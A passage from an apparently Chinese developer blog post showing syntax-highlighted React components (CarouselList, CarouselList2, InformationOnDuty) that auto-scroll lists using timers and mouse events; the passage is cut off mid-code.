class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"keyword\">class</span> CarouselList <span class=\"keyword\">extends</span> Component &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">props</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.state = &#123;</span><br><span class=\"line\">            data: <span class=\"keyword\">this</span>.props.data,</span><br><span class=\"line\">            scrollData: <span class=\"number\">0</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    componentDidMount = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.addHandleTimer();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    componentWillUnmount = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.removeHandleTimer();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//timers</span></span><br><span class=\"line\">    addHandleTimer = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> &#123; data, scrollData &#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!data || !data.length) <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.timer = setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (scrollData &gt; <span class=\"number\">-27</span>) &#123;</span><br><span class=\"line\">                scrollData--;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">                    scrollData: scrollData</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                scrollData = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">let</span> firstData = data[<span class=\"number\">0</span>];</span><br><span class=\"line\">                data.shift();</span><br><span class=\"line\">                data.push(firstData);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;, <span class=\"number\">70</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    removeHandleTimer = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.timer &amp;&amp; clearInterval(<span class=\"keyword\">this</span>.timer);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    handleScroll = <span class=\"function\"><span class=\"params\">e</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> ev = e || <span class=\"built_in\">window</span>.event;</span><br><span class=\"line\">        e.preventDefault();</span><br><span class=\"line\">        <span class=\"keyword\">const</span> conDom = <span class=\"keyword\">this</span>.refs[<span class=\"string\">\"content\"</span>];</span><br><span class=\"line\">        <span class=\"keyword\">const</span> speed = <span class=\"number\">5</span>; <span class=\"comment\">// scroll speed</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ev.deltaY &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            conDom.scrollTop += speed;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            conDom.scrollTop -= speed;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    render() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> &#123; data, scrollData &#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (</span><br><span class=\"line\">            &lt;div</span><br><span class=\"line\">                ref=<span class=\"string\">\"content\"</span></span><br><span class=\"line\">                onMouseEnter=&#123;<span class=\"keyword\">this</span>.removeHandleTimer&#125;</span><br><span class=\"line\">                onMouseLeave=&#123;<span class=\"keyword\">this</span>.addHandleTimer&#125;</span><br><span class=\"line\">                onWheel=&#123;<span class=\"keyword\">this</span>.handleScroll&#125;</span><br><span class=\"line\">            &gt;</span><br><span class=\"line\">                &lt;ul style=&#123;&#123; marginTop: scrollData + <span class=\"string\">\"px\"</span> &#125;&#125;&gt;</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        data.length &gt; <span class=\"number\">0</span> &amp;&amp; data.map(<span class=\"function\">(<span class=\"params\">item, index</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> (</span><br><span class=\"line\">                                <span class=\"keyword\">this</span>.props.type === <span class=\"string\">'simple'</span> ?</span><br><span class=\"line\">                                    &lt;li key=&#123;index&#125;&gt;&lt;p title=&#123;item.value&#125;&gt;&#123;item.value&#125;&lt;<span class=\"regexp\">/p&gt;&lt;/</span>li&gt;</span><br><span class=\"line\">                                    : &lt;li key=&#123;index&#125;&gt;&lt;span&gt;&#123;item.id&#125;&lt;<span class=\"regexp\">/span&gt;&lt;p title=&#123;item.intelligence&#125;&gt;&#123;item.intelligence&#125;&lt;/</span>p&gt;&lt;<span class=\"regexp\">/li&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                            )</span></span><br><span class=\"line\"><span class=\"regexp\">                            /</span><span class=\"regexp\">/ 默认：complex</span></span><br><span class=\"line\"><span class=\"regexp\">                            &#123;/</span>*&lt;li key=&#123;index&#125;&gt;&lt;span&gt;&#123;item.id&#125;&lt;<span class=\"regexp\">/span&gt;&lt;p title=&#123;item.intelligence&#125;&gt;&#123;item.intelligence&#125;&lt;/</span>p&gt;&lt;<span class=\"regexp\">/li&gt;*/</span> &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        )</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &lt;<span class=\"regexp\">/ul&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;/</span>div&gt;</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>CarouselList2.js</strong><br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"keyword\">class</span> CarouselList2 <span class=\"keyword\">extends</span> Component &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">props</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'是大法官'</span>,<span class=\"keyword\">this</span>.props.data)</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.state = &#123;</span><br><span class=\"line\">            data: <span class=\"keyword\">this</span>.props.data,</span><br><span class=\"line\">            scrollData: <span class=\"number\">0</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    componentDidMount = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.addHandleTimer();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    componentWillUnmount = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.removeHandleTimer();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"comment\">//timers</span></span><br><span class=\"line\">    addHandleTimer = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">let</span> &#123;data, scrollData&#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!data || !data.length) <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(data.length &lt; <span class=\"number\">5</span> ) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.timer = setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (scrollData &gt; <span class=\"number\">-52</span>) &#123;</span><br><span class=\"line\">                scrollData--;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">                    scrollData: scrollData</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                scrollData = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">let</span> firstData = data[<span class=\"number\">0</span>];</span><br><span class=\"line\">                data.shift();</span><br><span class=\"line\">                data.push(firstData);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">let</span> firstData1 = data[<span class=\"number\">0</span>];</span><br><span class=\"line\">                data.shift();</span><br><span class=\"line\">                data.push(firstData1);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;, <span class=\"number\">70</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    removeHandleTimer = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.timer &amp;&amp; clearInterval(<span class=\"keyword\">this</span>.timer);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    handleScroll = <span class=\"function\"><span class=\"params\">e</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> ev = e || <span class=\"built_in\">window</span>.event;</span><br><span class=\"line\">        e.preventDefault();</span><br><span class=\"line\">        <span class=\"keyword\">const</span> conDom = <span class=\"keyword\">this</span>.refs[<span class=\"string\">\"content\"</span>];</span><br><span class=\"line\">        <span class=\"keyword\">const</span> speed = <span class=\"number\">6</span>; <span class=\"comment\">// scroll speed</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ev.deltaY &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            conDom.scrollTop += speed;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            conDom.scrollTop -= speed;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    render() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> &#123;data, scrollData&#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (</span><br><span class=\"line\">            &lt;div</span><br><span class=\"line\">                ref=<span class=\"string\">\"content\"</span></span><br><span class=\"line\">                onMouseEnter=&#123;<span class=\"keyword\">this</span>.removeHandleTimer&#125;</span><br><span class=\"line\">                onMouseLeave=&#123;<span class=\"keyword\">this</span>.addHandleTimer&#125;</span><br><span class=\"line\">                onWheel=&#123;<span class=\"keyword\">this</span>.handleScroll&#125;</span><br><span class=\"line\">            &gt;</span><br><span class=\"line\">                &lt;ul style=&#123;&#123;marginTop: scrollData + <span class=\"string\">\"px\"</span>&#125;&#125;&gt;</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        data.length &gt; <span class=\"number\">0</span> &amp;&amp; data.map(<span class=\"function\">(<span class=\"params\">item, index</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">return</span> (</span><br><span class=\"line\">                                    <span class=\"keyword\">this</span>.props.type === <span class=\"string\">'superior'</span> ?</span><br><span class=\"line\">                                        &lt;li key=&#123;item.id&#125;&gt;</span><br><span class=\"line\">                                            &lt;p title=&#123;item.name&#125;&gt;&#123;item.name&#125;&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                                            &lt;p title=&#123;item.card&#125;&gt;&#123;item.card&#125;&lt;/</span>p&gt;</span><br><span class=\"line\">                                            &lt;p title=&#123;item.show&#125;&gt;&#123;item.show&#125;&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                                            &lt;p title=&#123;item.feedback&#125;&gt;&#123;item.feedback&#125;&lt;/</span>p&gt;</span><br><span class=\"line\">                                            &lt;p title=&#123;item.state&#125;&gt;&#123;item.state&#125;&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                                        &lt;/</span>li&gt;</span><br><span class=\"line\">                                        : &lt;li key=&#123;item.id&#125;&gt;</span><br><span class=\"line\">                                            &lt;p title=&#123;item.name&#125;&gt;&#123;item.name&#125;&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                                            &lt;p title=&#123;item.card&#125;&gt;&#123;item.card&#125;&lt;/</span>p&gt;</span><br><span class=\"line\">                                            &lt;p title=&#123;item.time&#125;&gt;&#123;item.time&#125;&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                                            &lt;p title=&#123;item.origin&#125;&gt;&#123;item.origin&#125;&lt;/</span>p&gt;</span><br><span class=\"line\">                                            &lt;p title=&#123;item.destination&#125;&gt;&#123;item.destination&#125;&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                                        &lt;/</span>li&gt;</span><br><span class=\"line\">                                )</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        )</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &lt;<span class=\"regexp\">/ul&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;/</span>div&gt;</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>InformationOnDuty.js</strong><br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"./InformationOnDuty.scss\"</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; hidden &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"ansi-colors\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> InformationOnDuty <span class=\"keyword\">extends</span> Component &#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(<span class=\"params\">props</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state = &#123;</span><br><span class=\"line\">      dutyList: [],</span><br><span class=\"line\">      scrollData: <span class=\"number\">0</span>,</span><br><span class=\"line\">      inital: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getOnDutyListData = <span class=\"keyword\">this</span>.getOnDutyListData.bind(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.animationInterval = <span class=\"keyword\">this</span>.animationInterval.bind(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.removeAnimationInterval = <span class=\"keyword\">this</span>.removeAnimationInterval.bind(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getOnDutyListData();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  getOnDutyListData() &#123;</span><br><span class=\"line\">    axios(&#123;</span><br><span class=\"line\">      method: <span class=\"string\">'GET'</span>,</span><br><span class=\"line\">      url: <span class=\"string\">`/OnDutyList`</span>,</span><br><span class=\"line\">    &#125;).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">        dutyList: res.data.result</span><br><span class=\"line\">      &#125;, <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"keyword\">this</span>.animationInterval())</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  animationInterval() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> &#123; scrollData, dutyList &#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!dutyList.length) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state.animationInterval = setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">        scrollData: scrollData--</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      </span><br><span class=\"line\">      <span class=\"keyword\">let</span> firstItem = dutyList[<span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (scrollData &lt; <span class=\"number\">0</span> &amp;&amp; scrollData &gt; <span class=\"number\">-2</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.state.inital) &#123;</span><br><span class=\"line\">          dutyList.push(dutyList[<span class=\"number\">0</span>]);</span><br><span class=\"line\">          <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">            inital: <span class=\"literal\">false</span></span><br><span class=\"line\">          &#125;)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">// dutyList.push(firstItem);</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (scrollData % <span class=\"number\">128</span> === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// debugger</span></span><br><span class=\"line\"></span><br><span class=\"line\">        dutyList.shift();</span><br><span class=\"line\"></span><br><span class=\"line\">        dutyList.push(firstItem);</span><br><span class=\"line\">        scrollData = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"comment\">// debugger</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"comment\">// if (scrollData &gt; -113) &#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//   let firstItem = dutyList[0];</span></span><br><span class=\"line\">      <span class=\"comment\">//   // dutyList.shift();</span></span><br><span class=\"line\">      <span class=\"comment\">//   // dutyList.push(firstItem);</span></span><br><span class=\"line\">      <span class=\"comment\">//   this.setState(&#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//     scrollData: scrollData--</span></span><br><span class=\"line\">      <span class=\"comment\">//   &#125;)</span></span><br><span class=\"line\">      <span class=\"comment\">// &#125; else &#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//   scrollData = 0;</span></span><br><span class=\"line\">      <span class=\"comment\">//   let firstItem = dutyList[0];</span></span><br><span class=\"line\">      <span class=\"comment\">//   dutyList.shift();</span></span><br><span class=\"line\">      <span class=\"comment\">//   dutyList.push(firstItem);</span></span><br><span class=\"line\">      <span class=\"comment\">// &#125;</span></span><br><span class=\"line\">    &#125;, <span class=\"number\">60</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  removeAnimationInterval() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state.animationInterval &amp;&amp; clearInterval(<span class=\"keyword\">this</span>.state.animationInterval);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  componentDidMount() &#123;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  componentWillReceiveProps() &#123;</span><br><span class=\"line\">    debugger</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  componenWillUnmount() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.removeAnimationInterval();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> &#123; dutyList, scrollData &#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div className=<span class=\"string\">\"InformationOnDuty\"</span>&gt;</span><br><span class=\"line\">        &lt;div className=<span class=\"string\">\"title\"</span>&gt;</span><br><span class=\"line\">          &lt;div className=<span class=\"string\">\"tit1\"</span>&gt;&lt;span&gt;值班信息&lt;<span class=\"regexp\">/span&gt;&lt;/</span>div&gt;</span><br><span class=\"line\">          &lt;div className=<span class=\"string\">\"tit2\"</span>&gt;&lt;span&gt;查看值班表&lt;<span class=\"regexp\">/span&gt;&lt;/</span>div&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;div</span></span><br><span class=\"line\"><span class=\"regexp\">          className=\"contetn\"</span></span><br><span class=\"line\"><span class=\"regexp\">          ref=\"content\"</span></span><br><span class=\"line\"><span class=\"regexp\">          onMouseEnter=&#123;this.removeAnimationInterval&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          onMouseLeave=&#123;this.animationInterval&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          style=&#123;&#123;overflow: 